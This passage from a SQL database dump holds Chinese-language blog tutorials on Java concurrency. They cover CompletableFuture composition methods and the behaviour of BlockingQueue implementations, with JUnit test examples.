(InterruptedException e) {\n                e.printStackTrace();\n            }\n        }).thenRun(()->{\n            System.out.println(\"done2\");\n        });\n        System.out.println(future.get()); // Hello\n        System.out.println(future2.get()); // null\n    }\n```\n#### thenCompose接收第一个结果作为第二个的输入\n```java\n	/**\n     * thenCompose接收第一个结果作为第二个的输入\n     * {@link CompletableFuture#thenCompose} 接收一个参数并返回一个参数\n     */\n    private static void thenCompose() throws ExecutionException, InterruptedException {\n        CompletableFuture.supplyAsync(() -> {\n            System.out.println(\"start the compose\");\n            sleep(5);\n            System.out.println(\"end the compose\");\n            return \"compose-1\";\n        }).thenCompose(s -> CompletableFuture.supplyAsync(() -> {\n            System.out.println(\"start the compose\");\n            sleep(3);\n            System.out.println(\"end the compose\");\n            System.out.println(s);\n            return s.length();\n        })).thenAccept(System.out::println);\n    }\n```\n\n\n#### thenAcceptBoth运行两个Future都结束后处理两个Future结果\n```java\n	/**\n     * thenAcceptBoth运行两个Future都结束后处理两个Future结果\n     * {@link CompletableFuture#thenAcceptBoth} 接收另一个CompletableFuture,两个Future都执行完毕后进行回调通知\n     * AcceptBoth 接受两个Future的输出\n     */\n    private static void thenAcceptBoth() {\n        CompletableFuture.supplyAsync(()->{\n            System.out.println(\"start the supplyAsync\");\n            sleep(5);\n            System.out.println(\"end the supplyAsync\");\n            return \"thenAcceptBoth\";\n        }).thenAcceptBoth(CompletableFuture.supplyAsync(()->{\n            System.out.println(\"start the thenAcceptBoth\");\n            sleep(5);\n            System.out.println(\"end the thenAcceptBoth\");\n            return 100;\n        }), (s, i) -> System.out.println(s + \"____\" + i));\n    } \n```\n#### acceptEither运行两个Future,只关注最先执行完毕的Future处理结果\n```java\n	/**\n     * acceptEither运行两个Future,只关注最先执行完毕的Future处理结果\n     *  只关注一个Future,但两个Future都会执行\n     * {@link CompletableFuture#acceptEither} 接收另一个CompletableFuture,其中一个Future执行完毕后就进行回调通知\n     * AcceptEither只关注其中一个结果\n     * AcceptEither 接受一个输出\n     */\n    private static void acceptEither() {\n        CompletableFuture.supplyAsync(()->{\n            System.out.println(\"start the acceptEither1\");\n            sleep(5);\n            System.out.println(\"end the acceptEither1\");\n            return \"acceptEither-1\";\n        }).acceptEither(CompletableFuture.supplyAsync(()->{\n            System.out.println(\"start the acceptEither2\");\n            sleep(3);\n            System.out.println(\"end the acceptEither2\");\n            return \"acceptEither-2\";\n        }), (result) -> {\n            System.out.println(result);\n        });\n    }\n```\n#### runAfterBoth运行两个Future都结束后处理\n```java\n	/**\n     * runAfterBoth运行两个Future都结束后处理\n     * {@link CompletableFuture#runAfterBoth} 接收另一个CompletableFuture,两个Future都执行完毕后进行回调通知\n     * runAfterBoth 两个Future任务都要结束才进行回调通知\n     * 与AcceptBoth不同的是,runAfterBoth不关注数据结果\n     */\n    private static void runAfterBoth() {\n        CompletableFuture.supplyAsync(()->{\n            System.out.println(\"start the runAfterBoth\");\n            sleep(3);\n            System.out.println(\"end the runAfterBoth\");\n            return \"runAfterBoth-1\";\n        }).runAfterBoth(CompletableFuture.supplyAsync(()->{\n            System.out.println(\"start the runAfterBoth\");\n            sleep(3);\n            System.out.println(\"end the runAfterBoth\");\n            return 100;\n        }), ()->System.out.println(\"DONE\"));\n    }\n```\n\n#### runAfterEither运行两个Future,只关注最先执行完毕的Future处理\n```java\n	/**\n     * runAfterEither运行两个Future,只关注最先执行完毕的Future处理\n     * 只关注一个Future,但两个Future都会执行\n     * {@link CompletableFuture#runAfterEither} 接收另一个CompletableFuture,其中一个Future执行完毕后就进行回调通知\n     * runAfterEither只关注其中一个结果\n     * 与AcceptEither不同的是,runAfterEither不关注数据结果\n     */\n    private static void runAfterEither() {\n        CompletableFuture.supplyAsync(()->{\n            System.out.println(\"start the runAfterEither\");\n            sleep(5);\n            System.out.println(\"end the runAfterEither\");\n            return \"runAfterBoth-1\";\n        }).runAfterEither(CompletableFuture.supplyAsync(()->{\n            System.out.println(\"start the runAfterEither\");\n            sleep(3);\n            System.out.println(\"end the runAfterEither\");\n            return 100;\n        }), ()->System.out.println(\"DONE\"));\n    }\n```\n\n#### thenCombine运行两个Future都结束后处理结果,处理后返回boolean\n```java\n	/**\n     * thenCombine运行两个Future都结束后处理结果,处理后返回boolean\n     * {@link CompletableFuture#thenCombine} 接收另一个CompletableFuture,两个Future都执行完毕后进行回调通知\n     * thenCombine返回的是boolean\n     * 与runAfterBoth不同的是,thenCombine回调通知的处理返回必须是boolean类型\n     */\n    private static void thenCombine() throws ExecutionException, InterruptedException {\n        CompletableFuture<Boolean> booleanCompletableFuture = CompletableFuture.supplyAsync(() -> {\n            System.out.println(\"start the combine1\");\n            sleep(5);\n            System.out.println(\"end the combine2\");\n            return \"combine-1\";\n        }).thenCombine(CompletableFuture.supplyAsync(() -> {\n            System.out.println(\"start the combine1\");\n            sleep(3);\n            System.out.println(\"end the combine1\");\n            return 100;\n        }), (str, i) -> str.length() > i).whenComplete((bool, throwable) -> System.out.println(bool));\n        System.out.println(booleanCompletableFuture.get());\n    }\n```\n#### getNow设定get的默认值\n```java\n	/**\n     *  getNow设定get的默认值\n     * {@link CompletableFuture#getNow(Object)} 设置get的默认值\n     * 调用{@link CompletableFuture#get()}时 如果有结果值返回结果值 否则返回getNow设定的默认值\n     */\n    private static void getNow() throws ExecutionException, InterruptedException {\n        CompletableFuture<String> future = CompletableFuture.supplyAsync(() -> {\n            sleep(3);\n            return \"HELLO\";\n        });\n        sleep(2);\n        String result = future.getNow(\"WORLD\");\n        System.out.println(result);\n        System.out.println(future.get());\n    }\n```\n#### complete设定get的默认值并得知是否还未获得执行结果\n```java\n	/**\n     * complete设定get的默认值并得知是否还未获得执行结果\n     * {@link CompletableFuture#complete} 是否还未获得执行结果,并设定get的默认值\n     */\n    private static void complete() throws ExecutionException, InterruptedException {\n        CompletableFuture<String> future = CompletableFuture.supplyAsync(() -> {\n            sleep(2);\n            System.out.println(\"=====I will be still process...=====\");\n            return \"HELLO\";\n        });\n        sleep(1);\n        boolean finished = future.complete(\"WORLD\"); // 是否还未获得执行结果\n        System.out.println(finished); // 是否执行结束\n        System.out.println(future.get()); // 执行结束返回结果值,否则返回默认值\n    }\n```\n#### join隐藏异常的get\n```java\n	/**\n     *  join隐藏异常的get\n     * {@link CompletableFuture#join} 与get一样,但不会让你捕获异常\n     */\n    private static void join() {\n        CompletableFuture<String> future = CompletableFuture.supplyAsync(() -> {\n            sleep(5);\n            System.out.println(\"=====I will be still process...=====\");\n            return \"HELLO\";\n        });\n        String result = future.join(); // 与get一样,但不会让你捕获异常\n        System.out.println(result);\n    }\n```\n#### completeExceptionally get时不进入阻塞等待,而是直接抛出异常\n```java\n	/**\n     * completeExceptionally get时不进入阻塞等待,而是直接抛出异常\n     * {@link CompletableFuture#completeExceptionally} get时不进入阻塞等待,而是直接抛出异常\n     */\n    private static void completeExceptionally() throws ExecutionException, InterruptedException {\n        CompletableFuture<String> future = CompletableFuture.supplyAsync(() -> {\n            // sleep(5);\n            System.out.println(\"=====I will be still process...=====\");\n            return \"HELLO\";\n        });\n        sleep(1);\n        future.completeExceptionally(new RuntimeException()); // get时不进入阻塞等待,而是直接抛出异常\n        System.out.println(future.get());\n    }\n```\n#### obtrudeException放弃Future,get时直接抛出异常\n```java\n	/**\n     * obtrudeException放弃Future,get时直接抛出异常\n     * {@link CompletableFuture#obtrudeException} get时不管怎么样都要抛出异常,对这个future放弃了\n     */\n    private static void obtrudeException() throws ExecutionException, InterruptedException {\n        CompletableFuture<String> future = CompletableFuture.supplyAsync(() -> {\n            // sleep(5);\n            System.out.println(\"=====I will be still process...=====\");\n            return \"HELLO\";\n        });\n        sleep(1);\n        future.obtrudeException(new RuntimeException()); // get时不管怎么样都要抛出异常,对这个future放弃了\n        System.out.println(future.get());\n    }\n```\n#### allOf运行多个任务,所有任务都结束后处理结果\n```java\n	/**\n     * allOf运行多个任务,所有任务都结束后处理结果\n     * {@link CompletableFuture#allOf(CompletableFuture[])} 参数是任务数组\n     * @return\n     */\n    private static void allOf() {\n        CompletableFuture.allOf(CompletableFuture.supplyAsync(() -> {\n            try {\n                System.out.println(\"1=====Start\");\n                TimeUnit.SECONDS.sleep(2);\n                System.out.println(\"1=====End\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            return \"1\";\n        }),CompletableFuture.supplyAsync(() -> {\n            try {\n                System.out.println(\"2=====Start\");\n                TimeUnit.SECONDS.sleep(5);\n                System.out.println(\"2=====End\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            return \"2\";\n        })).whenCompleteAsync((v, throwable) -> {\n            // 所有任务结束完毕,被会被调用,v是null\n            System.out.println(\"=====over=====\" + v);\n        });\n    }\n```\n\n#### anyOf运行多个任务,只关注最先执行完毕的任务处理结果\n```java\n	/**\n     * anyOf运行多个任务,只关注最先执行完毕的任务处理结果\n     * {@link CompletableFuture#anyOf(CompletableFuture[])} 参数是任务数组\n     * 只关注一个任务执行结束完毕,但其他任务依然都会执行\n     * @return\n     */\n    private static Future anyOf() {\n        return CompletableFuture.anyOf(CompletableFuture.supplyAsync(() -> {\n            try {\n                System.out.println(\"1=====Start\");\n                TimeUnit.SECONDS.sleep(2);\n                System.out.println(\"1=====End\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            return \"1\";\n        }),CompletableFuture.supplyAsync(() -> {\n            try {\n                System.out.println(\"2=====Start\");\n                TimeUnit.SECONDS.sleep(5);\n                System.out.println(\"2=====End\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            return \"2\";\n        })).whenCompleteAsync((v, throwable) -> {\n            // 只关注一个任务执行结束完毕,就会被调用,v是最先执行完毕的任务结果\n            System.out.println(\"=====over=====\" + v);\n        });\n    }\n```', 0, 0, 35, 0, 0, '2019-10-17 20:37:09', '2019-10-18 11:36:42', 0, 0);
INSERT INTO `article` VALUES (122, 1, '七种BlockingQueue-JUC', '2019/10/1571469014_mmexport1571315391006.jpg', '### BlockingQueue汇总\n#### ArrayBlockingQueue\n1. 基于数组实现的Queue,是最基础的BlockingQueue\n2. 有边界,size一旦固定,就无法更改\n\n#### PriorityBlockingQueue\n1. 无边界,size大小最大可以达到Integer.MAX_VALUE\n2. *有排序规则*,带优先级的阻塞队列\n3. 不允许插入null,因为需要排序\n4. 所有插入PriorityBlockingQueue的对象必须实现Comparable接口或者初始化PriorityBlockingQueue设定Comparator,因为队列的排序规则就是根据Comparable或Comparator接口实现来定义的\n5. 我们可以从PriorityBlockingQueue中获得一个迭代器iterator,但这个迭代器并不保证按照我们优先级的顺序进行迭代\n\n#### LinkedBlockingQueue\n1. LinkedBlockingQueue是链表实现的,并且可以无边界,最大值Integer#MAX_VALUE\n2. 边界大小配置是可选的,如果初始化时指定了大小,那么它就是有边界的,如果不指定就是无边界\n3. 与基于数组实现的ArrayBlockingQueue的区别是,LinkedBlockingQueue是链表实现的,而ArrayBlockingQueue是基于数组实现\n\n#### SynchronousQueue\n1. 采用transfer方式,实际上SynchronousQueue内没有容量\n2. 当一个线程插入一个元素后就会被阻塞,除非这个元素为另一个消费,否则就会失败\n3. 因此我们称它为*同步队列*,它是一个无界非缓存的队列,不存储元素,新放入的元素只有等待取走旧元素之后才能放入\n4. 这是一种交换,实际上同步队列没有任何内部容量\n\n#### DelayQueue\n1. 它使用了PriorityQueue,无边界\n2. 它阻塞的是内部未过期时间元素,不允许插入null值\n3. DelayQueue的元素必须实现一个*Delay接口*,Delay接口继承了Comparable接口\n4. DelayQueue中的元素都要进行排序,一般情况下都是按照元素过期时间的优先级进行排序;当元素过期的时候可以拿出;比如某个数据5秒需要被处理,某个数据3秒,那么就会按照这种时间顺序排序\n\n#### LinkedBlockingDeque\n1. 双向队列,既能从头插入也能从尾插入\n2. 如果初始化时指定了大小,那么它就是有边界的,如果不指定就是无边界\n\n#### LinkedTransferQueue\n1. 无边界\n2. 不同与其他队列,该队列生产必须到等到消费者前来消费才算结束\n3. TransferQueue在需要确保消息传递的情况下很有用\n\n### ArrayBlockingQueue\n#### 特点\n1. 基于数组实现的Queue,是最基础的BlockingQueue\n2. 有边界,size一旦固定,就无法更改\n\n#### 示例\n```java\npublic class ArrayBlockingQueueExample {\n    /**\n     * 1. 基于数组实现的Queue,遵循FIFO(先进先出)原则\n     * 2. 有边界,size一旦固定,就无法更改\n     * 3. 是最基础的BlockingQueue\n     * @param size\n     * @param <T>\n     * @return\n     */\n    public <T> ArrayBlockingQueue<T> create(int size) {\n        return new ArrayBlockingQueue<>(size); // size边界,与数组一样\n    }\n}\n\npublic class ArrayBlockingQueueExampleTest {\n\n    private ArrayBlockingQueueExample example;\n\n    @Before\n    public void setUp() {\n        example = new ArrayBlockingQueueExample();\n    }\n\n    @After\n    public void tearDown() {\n        example = null;\n    }\n\n    /**\n     *  队列满了,add会抛出异常java.lang.IllegalStateException: Queue full\n     * {@link ArrayBlockingQueue#add(Object)}\n     */\n    @Test(expected = IllegalStateException.class)\n    public void testAdd() {\n        ArrayBlockingQueue<String> queue = example.create(5);\n        assertThat(queue.add(\"Hello1\"), equalTo(true));\n        assertThat(queue.add(\"Hello2\"), equalTo(true));\n        assertThat(queue.add(\"Hello3\"), equalTo(true));\n        assertThat(queue.add(\"Hello4\"), equalTo(true));\n        assertThat(queue.add(\"Hello5\"), equalTo(true));\n        assertThat(queue.add(\"Hello6\"), equalTo(true));// 队列满了,add会抛出异常java.lang.IllegalStateException: Queue full\n        fail(\"should not process to here\");\n    }\n\n    /**\n     *  队列满了,offer会返回false,表示插入失败\n     * {@link ArrayBlockingQueue#offer(Object)}\n     */\n    @Test\n    public void testOffer() {\n        ArrayBlockingQueue<String> queue = example.create(5);\n        assertThat(queue.offer(\"Hello1\"), equalTo(true));\n        assertThat(queue.offer(\"Hello2\"), equalTo(true));\n        assertThat(queue.offer(\"Hello3\"), equalTo(true));\n        assertThat(queue.offer(\"Hello4\"), equalTo(true));\n        assertThat(queue.offer(\"Hello5\"), equalTo(true));\n        assertThat(queue.offer(\"Hello6\"), equalTo(false));// 队列满了,offer会返回false,表示插入失败\n        assertThat(queue.size(), equalTo(5));\n    }\n\n    /**\n     *  队列满了,put会进入阻塞等待直到队列元素被消费或者被打断\n     * {@link ArrayBlockingQueue#put(Object)}\n     * @throws InterruptedException\n     */\n    @Test\n    public void testPut() throws InterruptedException {\n        ArrayBlockingQueue<String> queue = example.create(5);\n        queue.put(\"Hello1\");\n        queue.put(\"Hello2\");\n        queue.put(\"Hello3\");\n        queue.put(\"Hello4\");\n        queue.put(\"Hello5\");\n        queue.put(\"Hello6\"); // 队列满了,put会进入阻塞等待直到队列元素被消费或者被打断\n        System.out.println(\"should not process to here\");\n    }\n\n    /**\n     *  队列空时, poll拿出null空值\n     * {@link ArrayBlockingQueue#poll()}\n     */\n    @Test\n    public void testPoll() {\n        ArrayBlockingQueue<String> queue = example.create(2);\n        queue.add(\"Hello1\");\n        queue.add(\"Hello2\");\n\n        assertThat(queue.poll(), equalTo(\"Hello1\"));\n        assertThat(queue.poll(), equalTo(\"Hello2\"));\n        assertThat(queue.poll(), nullValue()); //队列空时, poll拿出null空值\n    }\n\n    /**\n     *  队列空时, remove将抛出异常\n     * {@link ArrayBlockingQueue#remove()}\n     */\n    @Test(expected = NoSuchElementException.class)\n    public void testRemove() {\n        ArrayBlockingQueue<String> queue = example.create(2);\n        queue.add(\"Hello1\");\n        queue.add(\"Hello2\");\n\n        assertThat(queue.remove(), equalTo(\"Hello1\"));\n        assertThat(queue.remove(), equalTo(\"Hello2\"));\n        assertThat(queue.remove(), equalTo(\"Hello2\"));// 队列空时, remove将抛出异常\n    }\n\n    /**\n     *  peek不会删除数据,每次拿当前头数据(第一个数据)\n     * {@link ArrayBlockingQueue#peek()}\n     */\n    @Test\n    public void testPeek() {\n        ArrayBlockingQueue<String> queue = example.create(2);\n        queue.add(\"Hello1\");\n        queue.add(\"Hello2\");\n\n        assertThat(queue.peek(), equalTo(\"Hello1\")); // peek不会删除数据,每次拿当前头数据(第一个数据)\n        assertThat(queue.peek(), equalTo(\"Hello1\"));\n        assertThat(queue.peek(), equalTo(\"Hello1\"));\n        assertThat(queue.peek(), equalTo(\"Hello1\"));\n        assertThat(queue.peek(), equalTo(\"Hello1\"));\n    }\n\n    /**\n     *  element不会删除数据,每次拿当前头数据(第一个数据)\n     *  与peek不同在于,当队列为空时,将抛出异常NoSuchElementException\n     * {@link ArrayBlockingQueue#element()}\n     */\n    @Test(expected = NoSuchElementException.class)\n    public void testElement() {\n        ArrayBlockingQueue<String> queue = example.create(2);\n        queue.add(\"Hello1\");\n        queue.add(\"Hello2\");\n\n        assertThat(queue.element(), equalTo(\"Hello1\")); // element不会删除数据,每次拿当前头数据(第一个数据)\n        assertThat(queue.element(), equalTo(\"Hello1\"));\n        assertThat(queue.element(), equalTo(\"Hello1\"));\n        queue.clear();\n        assertThat(queue.element(), equalTo(\"Hello1\")); // 与peek不同在于,当队列为空时,将抛出异常NoSuchElementException\n    }\n\n    /**\n     * 队列空时,take会阻塞等待直到获取到元素或被中断\n     * {@link ArrayBlockingQueue#take()}\n     * @throws InterruptedException\n     */\n    @Test\n    public void testTake() throws InterruptedException {\n        ArrayBlockingQueue<String> queue = example.create(2);\n        queue.add(\"Hello1\");\n        queue.add(\"Hello2\");\n\n        assertThat(queue.take(), equalTo(\"Hello1\"));\n        assertThat(queue.take(), equalTo(\"Hello2\"));\n        assertThat(queue.take(), equalTo(\"Hello2\"));// 队列空时,take会阻塞等待直到获取到元素或被中断\n    }\n\n    /**\n     * drainTo: 排空队列元素至一个集合当中\n     */\n    @Test\n    public void testDrainTo() {\n        ArrayBlockingQueue<String> queue = example.create(5); // 队列大小5个\n        queue.add(\"Hello1\");\n        queue.add(\"Hello2\");\n        queue.add(\"Hello3\");\n        assertThat(queue.size(), equalTo(3)); // 队列元素大小所占3个\n        assertThat(queue.remainingCapacity(), equalTo(2)); // 队列剩余大小2个\n\n        assertThat(queue.remove(), equalTo(\"Hello1\"));\n\n        assertThat(queue.size(), equalTo(2));\n        assertThat(queue.remainingCapacity(), equalTo(3));\n\n        List<String> list =  new ArrayList<>();\n        queue.drainTo(list);\n        assertThat(queue.size(), equalTo(0));\n        assertThat(queue.remainingCapacity(), equalTo(5));\n\n        assertThat(list.size(), equalTo(2));\n    }\n}\n```\n\n#### API\n1. **add**: 队列满了,add会抛出异常java.lang.IllegalStateException\n2. **offer**: 队列满了,offer会返回false,表示插入失败\n3. **put**: 队列满了,put会进入阻塞等待直到队列元素被消费或者被打断\n4. **poll**: 队列空时, poll拿出null空值\n5. **remove**: 队列空时, remove将抛出异常\n6. **peek**: peek不会删除数据,每次拿当前头数据(第一个数据)\n7. **element**: element不会删除数据,每次拿当前头数据(第一个数据),与peek不同在于,当队列为空时,将抛出异常NoSuchElementException\n8. **take**: 队列空时,take会阻塞等待直到获取到元素或被中断\n9. **drainTo**: 排空队列元素至一个集合当中\n\n### PriorityBlockingQueue\n#### 特点\n1. 无边界,size大小最大可以达到Integer.MAX_VALUE\n2. *有排序规则*,带优先级的阻塞队列\n3. 不允许插入null,因为需要排序\n4. 所有插入PriorityBlockingQueue的对象必须实现Comparable接口或者初始化PriorityBlockingQueue设定Comparator,因为队列的排序规则就是根据Comparable或Comparator接口实现来定义的\n5. 我们可以从PriorityBlockingQueue中获得一个迭代器iterator,但这个迭代器并不保证按照我们优先级的顺序进行迭代\n\n#### 示例\n```java\npublic class PriorityBlockingQueueExample {\n    /**\n     * 1. 无边界,size大小最大可以达到Integer.MAX_VALUE\n     * 2. *有排序规则*,带优先级的阻塞队列\n     * 3. 不允许插入null,因为需要排序\n     * 4. 所有插入PriorityBlockingQueue的对象必须实现Comparable接口或者初始化PriorityBlockingQueue设定Comparator\n     *      因为队列的排序规则就是根据Comparable或Comparator接口实现来定义的\n     * 5. 我们可以从PriorityBlockingQueue中获得一个迭代器iterator,但这个迭代器并不保证按照我们优先级的顺序进行迭代\n     */\n    public <T> PriorityBlockingQueue<T> create(int size) {\n        return new PriorityBlockingQueue<>(size); // 默认大小值\n    }\n\n    public <T> PriorityBlockingQueue<T> create(int size, Comparator<T> comparator) {\n        return new PriorityBlockingQueue<>(size, comparator); // 默认大小值与Comparator\n    }\n}\npublic class PriorityBlockingQueueExampleTest {\n\n    private PriorityBlockingQueueExample example;\n\n    @Before\n    public void setUp() {\n        example = new PriorityBlockingQueueExample();\n    }\n\n    @After\n    public void tearDown() {\n        example = null;\n    }\n\n    /**\n     * 不允许插入null\n     * PriorityBlockingQueue不允许插入null,会抛出异常NullPointerException\n     */\n    @Test(expected = NullPointerException.class)\n    public void testAddNullElement() {\n        PriorityBlockingQueue<String> queue = example.create(3);\n        queue.add(null); // PriorityBlockingQueue不允许插入null,会抛出异常NullPointerException\n    }\n\n    /**\n     * 自动扩容,当默认值不够时会自动扩容,最大可达到Integer.MAX_VALUE\n     */\n    @Test\n    public void testAddNewElement() {\n        PriorityBlockingQueue<String> queue = example.create(5);// 默认值5个,当不够时会自动扩容,最大可达到Integer.MAX_VALUE\n        assertThat(queue.add(\"Hello1\"), equalTo(true));\n        assertThat(queue.add(\"Hello2\"), equalTo(true));\n        assertThat(queue.add(\"Hello3\"), equalTo(true));\n        assertThat(queue.add(\"Hello4\"), equalTo(true));\n        assertThat(queue.add(\"Hello5\"), equalTo(true));\n        assertThat(queue.add(\"Hello6\"), equalTo(true));\n        assertThat(queue.size(), equalTo(6));\n    }\n\n    /**\n     * 拥有排序规则\n     * PriorityBlockingQueue按从小到大的优先级排序\n     * @throws InterruptedException\n     */\n    @Test\n    public void testGetElement() throws InterruptedException {\n        PriorityBlockingQueue<String> queue = example.create(3);\n        assertThat(queue.add(\"Hello4\"), equalTo(true));\n        assertThat(queue.add(\"Hello2\"), equalTo(true));\n        assertThat(queue.add(\"Hello3\"), equalTo(true));\n\n        assertThat(queue.element(), equalTo(\"Hello2\")); // PriorityBlockingQueue按从小到大的优先级排序\n        assertThat(queue.size(), equalTo(3));\n\n        assertThat(queue.peek(), equalTo(\"Hello2\"));\n        assertThat(queue.size(), equalTo(3));\n\n        assertThat(queue.poll(), equalTo(\"Hello2\"));\n        assertThat(queue.size(), equalTo(2));\n        assertThat(queue.poll(), equalTo(\"Hello3\"));\n        assertThat(queue.size(), equalTo(1));\n\n        assertThat(queue.take(), equalTo(\"Hello4\"));\n        assertThat(queue.size(), equalTo(0)); // 队列中已经没元素了\n\n        ScheduledExecutorService scheduledExecutorService = Executors.newSingleThreadScheduledExecutor();\n        scheduledExecutorService.schedule(()->queue.add(\"NEW_DATA\"), 1, TimeUnit.SECONDS);\n        scheduledExecutorService.shutdown();\n        assertThat(queue.take(), equalTo(\"NEW_DATA\")); // 当队列为空时会进入阻塞,直到获取到元素或被中断\n    }\n\n    /**\n     * PriorityBlockingQueue的迭代器,但迭代器不保证排序规则\n     * 我们可以从PriorityBlockingQueue中获得一个迭代器iterator,但这个迭代器并不保证按照我们优先级的顺序进行迭代\n     */\n    @Test\n    public void tt() {\n        PriorityBlockingQueue<String> queue = example.create(3);\n        queue.add(\"Hello1\");\n        queue.add(\"Hello2\");\n        queue.add(\"Hello3\");\n        Iterator<String> iterator = queue.iterator();\n        while (iterator.hasNext()) {\n            System.out.println(iterator.next());\n        }\n    }\n\n    /**\n     * 所有插入PriorityBlockingQueue的对象必须实现Comparable接口或者初始化PriorityBlockingQueue设定Comparator\n     * 队列的排序规则就是根据Comparable接口实现来定义的\n     * 否则就会出错\n     */\n    @Test(expected = ClassCastException.class)\n    public void testAddObject_WithNoComparable_WithNoComparator() {\n        PriorityBlockingQueue<UserWithNoComparable> queue = example.create(3);\n        queue.add(new UserWithNoComparable());\n        fail(\"should not process to here\");\n    }\n\n    /**\n     * 初始化PriorityBlockingQueue设定Comparator\n     */\n    @Test\n    public void testAddObject_WithNoComparable_WithComparator() {\n        PriorityBlockingQueue<UserWithNoComparable> queue = example.create(3, (o1, o2) -> o1.hashCode()-o2.hashCode());\n        queue.add(new UserWithNoComparable());\n    }\n\n    @Test\n    public void testAddObject_WithComparable_WithNoComparator() {\n        PriorityBlockingQueue<UserWithNoComparable2> queue = example.create(3);\n        queue.add(new UserWithNoComparable2());\n    }\n\n    static class UserWithNoComparable {\n\n    }\n\n    static class UserWithNoComparable2 implements Comparable<UserWithNoComparable2> {\n        @Override\n        public int compareTo(UserWithNoComparable2 o) {\n            return 0;\n        }\n    }\n\n}\n```\n### LinkedBlockingQueue\n#### 特点\n1. LinkedBlockingQueue是链表实现的,并且可以无边界,最大值Integer#MAX_VALUE\n2. 边界大小配置是可选的,如果初始化时指定了大小,那么它就是有边界的,如果不指定就是无边界\n3. 与基于数组实现的ArrayBlockingQueue的区别是,LinkedBlockingQueue是链表实现的,而ArrayBlockingQueue是基于数组实现\n\n#### 示例\n```java\npublic class LinkedBlockingQueueExample {\n    /**\n     * 1. LinkedBlockingQueue是链表实现的,并且可以无边界,最大值Integer#MAX_VALUE\n     * 2. 边界大小配置是可选的,如果初始化时指定了大小,那么它就是有边界的,如果不指定就是无边界\n     * 3. 与基于数组实现的ArrayBlockingQueue的区别是,LinkedBlockingQueue是链表实现的,而ArrayBlockingQueue是基于数组实现的\n     * @param <T>\n     * @return\n     */\n    public <T> LinkedBlockingQueue<T> create() {\n        return new LinkedBlockingQueue<>(); // 无边界,最大值Integer#MAX_VALUE\n    }\n\n    public <T> LinkedBlockingQueue<T> create(int size) {\n        return new LinkedBlockingQueue<>(size); // 指定大小,有边界\n    }\n}\npublic class LinkedBlockingQueueExampleTest {\n\n    private LinkedBlockingQueueExample example;\n\n    @Before\n    public void setUp() {\n        example = new LinkedBlockingQueueExample();\n    }\n\n    @After\n    public void tearDown() {\n        example = null;\n    }\n\n    /**\n     *  测试插入方法\n     * Test the {@link java.util.concurrent.LinkedBlockingQueue#add(Object)}\n     * Test the {@link java.util.concurrent.LinkedBlockingQueue#offer(Object)}\n     * Test the {@link java.util.concurrent.LinkedBlockingQueue#put(Object)}\n     */\n    @Test\n    public void testInsertData() throws InterruptedException {\n        LinkedBlockingQueue<String> queue = example.create(2);\n        assertThat(queue.offer(\"data1\"), equalTo(true));\n        assertThat(queue.offer(\"data2\"), equalTo(true));\n        assertThat(queue.offer(\"data3\"), equalTo(false));\n\n        queue.clear();\n        assertThat(queue.add(\"data1\"), equalTo(true));\n        assertThat(queue.add(\"data2\"), equalTo(true));\n\n        queue.put(\"data3\"); // 队列满了,put会进入阻塞等待直到队列元素被消费或者被打断\n    }\n\n    /**\n     * 测试删除方法\n     * @throws InterruptedException\n     */\n    @Test\n    public void testRemoveData() throws InterruptedException {\n        LinkedBlockingQueue<String> queue = example.create(2);\n        assertThat(queue.offer(\"data1\"), equalTo(true));\n        assertThat(queue.offer(\"data2\"), equalTo(true));\n        assertThat(queue.offer(\"data3\"), equalTo(false));\n\n        assertThat(queue.element(), equalTo(\"data1\"));\n\n        assertThat(queue.peek(), equalTo(\"data1\"));\n\n        assertThat(queue.remove(), equalTo(\"data1\"));\n        assertThat(queue.poll(), equalTo(\"data2\"));\n        assertThat(queue.size(), equalTo(0));\n        assertThat(queue.remainingCapacity(), equalTo(2));\n\n        assertThat(queue.take(), equalTo(\"xxx\"));// 队列空时,take会阻塞等待直到获取到元素或被中断\n    }\n}\n```\n### SynchronousQueue\n#### 特点\n1. 采用transfer方式,实际上SynchronousQueue内没有容量\n2. 当一个线程插入一个元素后就会被阻塞,除非这个元素为另一个消费,否则就会失败\n3. 因此我们称它为*同步队列*,它是一个无界非缓存的队列,不存储元素,新放入的元素只有等待取走旧元素之后才能放入\n4. 这是一种交换,实际上同步队列没有任何内部容量\n\n#### 示例\n```java\npublic class SynchronousQueueExample {\n    /**\n     * 1. 采用transfer方式,实际上SynchronousQueue内没有容量\n     * 1. 当一个线程插入一个元素后就会被阻塞,除非这个元素为另一个消费,否则就会失败\n     * 2. 因此我们称它为*同步队列*,它是一个无界非缓存的队列,不存储元素,新放入的元素只有等待取走旧元素之后才能放入\n     * 3. 这是一种交换,实际上同步队列没有任何内部容量\n     * @param <T>\n     * @return\n     */\n    public <T> SynchronousQueue<T> create() {\n        return new SynchronousQueue<>();\n    }\n}\npublic class SynchronousQueueExampleTest {\n\n    private SynchronousQueueExample example;\n\n    @Before\n    public void setUp() {\n        example = new SynchronousQueueExample();\n    }\n\n    @After\n    public void tearDown() {\n        example = null;\n    }\n\n    /**\n     * 直接add添加相会导致抛出异常java.lang.IllegalStateException,必须需要一个消费进行等待\n     * @throws InterruptedException\n     */\n    @Test(expected = IllegalStateException.class)\n    public void testAdd() throws InterruptedException {\n        SynchronousQueue<String> queue = example.create();\n        queue.add(\"SynchronousQueue\");\n    }\n\n    /**\n     * 创建线程进行take消费处理等待中,那么add就不会出错\n     * @throws InterruptedException\n     */\n    @Test\n    public void testAdd2() throws InterruptedException {\n        SynchronousQueue<String> queue = example.create();\n        Executors.newSingleThreadExecutor().submit(()->{\n            try {\n                assertThat(queue.take(), equalTo(\"SynchronousQueue\"));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n        TimeUnit.MILLISECONDS.sleep(5);\n        assertThat(queue.add(\"SynchronousQueue\"), equalTo(true));\n    }\n\n    /**\n     *  使用put会进入阻塞等待直到队列元素被消费或者被打断\n     * @throws InterruptedException\n     */\n    @Test\n    public void testPut() throws InterruptedException {\n        SynchronousQueue<String> queue = example.create();\n        queue.put(\"SynchronousQueue\"); // put会进入阻塞等待直到队列元素被消费或者被打断\n        fail(\"should not process to here\");\n    }\n}\n```\n### DelayQueue\n#### 特点\n1. 它使用了PriorityQueue,无边界\n2. 它阻塞的是内部未过期时间元素,不允许插入null值\n3. 